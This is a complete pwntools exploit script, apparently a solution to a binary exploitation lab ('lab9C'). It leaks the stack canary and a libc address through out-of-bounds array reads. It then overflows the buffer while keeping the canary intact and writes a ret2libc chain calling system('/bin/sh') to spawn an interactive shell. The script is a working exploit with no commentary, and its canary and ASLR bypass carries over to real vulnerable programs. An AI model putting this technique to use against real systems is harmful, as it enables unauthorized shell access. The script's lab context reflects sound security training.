from pwn import *

def leak_cookie():

    p.sendlineafter("Enter choice: ", "2")
    p.sendlineafter("Choose an index: ", "257")

    p.recvuntil(" = ")

    return int(p.recvline())

def leak_libc_start_main():

    p.sendlineafter("Enter choice: ", "2")
    p.sendlineafter("Choose an index: ", "261")

    p.recvuntil(" = ")

    libc = int(p.recvline())
    if libc < 0:
        libc = -((libc - 1) ^ 0xffffffff)

    libc = libc - 0xf1

    return libc

def write(what):

    p.sendlineafter("Enter choice: ", "1")
    p.sendlineafter("Enter a number: ", str(what))

def quit():
    p.sendlineafter("Enter choice: ", "3")

p = process("./lab9C")

pause()
cookie = leak_cookie()
libc = leak_libc_start_main()
binsh  = libc + 0x16533f
system = libc + 0x24470
log.success("Cookie: " + hex(cookie))
log.success("Libc: " + hex(libc))
log.success("System: " + hex(system))
log.success("binsh: " + hex(binsh))

for i in range(0, 256): write("AAAA")
write(str(cookie))

write("BBBB")
write("AAAA")
write("AAAA")

write(system)
write(0xdeadbeef)
write(binsh)

quit()

p.interactive()
